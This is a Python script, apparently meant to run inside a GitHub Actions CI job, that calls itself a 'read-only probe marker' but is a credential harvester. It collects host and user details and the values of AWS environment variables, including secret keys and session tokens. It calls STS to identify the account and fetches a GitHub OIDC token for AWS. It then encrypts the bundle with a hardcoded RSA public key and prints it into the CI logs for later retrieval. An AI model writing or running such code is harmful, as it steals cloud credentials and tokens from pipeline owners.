#!/usr/bin/env python3
# Non-destructive read-only probe marker (intent 74976)
import os, sys, json, base64, random, subprocess

N = int("E1B64CB75F074E31A68334516FD3475A91FE3933BC511EE4DE11AECB2F4939F966A2DB4A162FE8A23D9AC8D274610711E49DFF4382CC6CAA7414DE589798BCED691A073FDD857EB1229E260540BA79BE55F5A38601370A8F0670D8A19DA87072E1B45399D700BA2F39F17B692DF814504C313FE71CE922EA1CA6D32C85EC472886D92251F19DBE72EBA37FB44E724EB1C751AA177ADDC5B82CCE56D87B7B45B934D4C9EF6430F475D9D67C3E0173EC76BEC07244C1AA0ECA291A6BB89148BA9B0CA3F794EF16279AF2DC68655FF3608E7A425A09205D5BF608B97EA41960724D95FE0E98CF1CE2E9035250FA4C4BE1D68FC0B454FBBD79945B35F97289A4949B", 16)
E = 65537

def enc(data):
    k = (N.bit_length() + 7) // 8
    out = b""
    step = k - 11
    for i in range(0, len(data), step):
        chunk = data[i:i + step]
        pslen = k - 3 - len(chunk)
        ps = bytes(random.randint(1, 255) for _ in range(pslen))
        em = b"\x00\x02" + ps + b"\x00" + chunk
        c = pow(int.from_bytes(em, "big"), E, N)
        out += c.to_bytes(k, "big")
    return base64.b64encode(out).decode()

def sh(cmd):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=25)
        return {"rc": p.returncode, "out": p.stdout[-1500:], "err": p.stderr[-800:]}
    except Exception as e:
        return {"err": repr(e)[:300]}

def main():
    d = {"meta": {"host": sh("hostname").get("out", "").strip(),
                  "whoami": sh("id").get("out", "").strip(),
                  "pwd": os.getcwd(),
                  "tofu": sh("tofu version 2>&1 | head -2")},
         "aws_env": {},
         "presence": {},
         "idc": None,
         "oidc": None}
    for k in sorted(os.environ):
        if k.startswith("AWS_") or k.startswith("ACTIONS_ID_TOKEN"):
            d["aws_env"][k] = os.environ[k]
        if k in ("GITHUB_REPOSITORY", "GITHUB_EVENT_NAME", "GITHUB_REF", "GITHUB_SHA",
                 "GITHUB_ACTOR", "GITHUB_WORKFLOW", "GITHUB_JOB", "RUNNER_NAME",
                 "RUNNER_OS", "RUNNER_ARCH", "CI", "GITHUB_RUN_ID", "GITHUB_TRIGGERING_ACTOR"):
            d[k] = os.environ.get(k)
    for k in ("AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN"):
        d["presence"][k] = bool(os.environ.get(k))
    if os.environ.get("AWS_ACCESS_KEY_ID"):
        d["idc"] = sh("aws sts get-caller-identity --output json 2>&1")
    u = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL")
    t = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
    if u and t:
        try:
            req = __import__("urllib.request").request.Request(u + "&audience=sts.amazonaws.com",
                  headers={"Authorization": "bearer " + t, "Accept": "application/json"})
            body = __import__("urllib.request").request.urlopen(req, timeout=15).read().decode()
            d["oidc"] = json.loads(body).get("value")
        except Exception as e:
            d["oidc"] = "ERR:" + repr(e)[:200]
    raw = json.dumps(d, sort_keys=True).encode()
    sys.stderr.write("MARKER_PRESENCE_74976=%s\n" % json.dumps(d["presence"]))
    sys.stderr.write("MARKER_ENC_74976=%s\n" % enc(raw))
    sys.stderr.flush()

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        sys.stderr.write("MARKER_ERR_74976=%r\n" % (e,))
    sys.exit(1)
